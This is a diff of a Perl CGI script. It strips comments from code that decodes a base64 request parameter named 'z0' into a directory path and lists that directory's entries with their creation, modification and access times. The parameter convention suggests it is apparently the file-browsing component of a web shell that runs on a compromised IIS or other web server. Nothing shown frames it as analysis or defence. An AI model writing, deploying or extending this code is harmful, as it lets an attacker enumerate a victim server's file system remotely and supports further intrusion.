@@ -8,7 +8,6 @@ use Cwd qw(abs_path);
 sub to_iso {
     my $t = shift;
 
-    # fallback instead of empty string
     return "1970-01-01T00:00:00"
         unless defined $t && $t > 0;
 
@@ -30,7 +29,6 @@ my $q = CGI->new;
 my $dir = eval { decode_base64($q->param('z0') || '') };
 $dir //= '';
 
-# normalize path (important for Windows/IIS)
 $dir = abs_path($dir) if -d $dir;
 
 if (!$dir || !-d $dir) {
@@ -52,12 +50,9 @@ foreach my $entry (@entries) {
 
     my $path = File::Spec->catfile($dir, $entry);
 
-    # ensure file exists before stat
     next unless -e $path;
 
     my @stat = stat($path);
-
-    # robust fallback (prevents empty datetime)
     my ($ctime, $mtime, $atime) = (0, 0, 0);
 
     if (@stat) {
